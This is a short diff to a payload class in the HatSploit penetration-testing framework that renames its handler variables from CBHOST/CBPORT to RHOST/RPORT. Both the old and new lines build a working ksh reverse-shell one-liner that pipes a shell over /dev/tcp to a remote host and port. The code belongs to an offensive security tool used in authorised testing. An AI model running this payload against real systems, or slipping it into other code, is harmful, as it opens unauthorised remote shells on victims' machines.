@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
-        payload = f"ksh -c 'ksh >/dev/tcp/{connback_host}/{connback_port} 2>&1 <&1'"
+        payload = f"ksh -c 'ksh >/dev/tcp/{remote_host}/{remote_port} 2>&1 <&1'"
         return payload
